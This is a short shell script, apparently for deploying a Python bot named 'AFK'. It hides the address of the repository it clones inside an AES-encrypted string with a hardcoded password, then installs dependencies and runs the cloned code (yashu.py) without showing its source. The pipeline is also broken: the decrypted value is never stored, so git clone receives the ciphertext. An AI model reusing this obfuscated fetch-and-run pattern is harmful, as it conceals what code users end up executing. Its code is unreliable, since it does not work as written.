export R="U2FsdGVkX18LDA16WR+WhtzUuQxtS+H8hZfRDvKQdhHWm7lep8sy3dk+cxR+7Q9CmkFlSYxfwuJqw83h4oTJwA==" | openssl aes-256-cbc -d -a -pass pass:somepassword
python3 -m pip install -r requirements.txt
python3 env_vars.py
git clone $R AFK
cd AFK
python3 yashu.py
